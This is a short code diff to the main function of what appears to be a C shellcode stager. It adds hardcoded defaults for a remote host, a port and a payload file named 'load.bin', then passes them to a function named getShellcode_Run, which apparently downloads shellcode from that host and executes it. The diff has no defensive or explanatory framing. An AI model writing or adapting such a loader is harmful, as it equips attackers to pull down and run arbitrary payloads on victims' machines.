@@ -158,14 +158,20 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
 int main(int argc, char** argv) {
 
+    char* host="192.168.235.132";
+    char* port="3333";
+    char* PayLoadFile="load.bin";
+	
+	
     // Validate the parameters
-    if (argc != 4) {
-        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);
-        return 1;
-    }
-
-    getShellcode_Run(argv[1], argv[2], argv[3]);
-
+    if (argc == 4) {
+	host= argv[1];
+        port= argv[2];
+        PayLoadFile=argv[3];   
+    }	    
+	
+    getShellcode_Run(host, port, PayLoadFile);
+	
     return 0;
 
 }
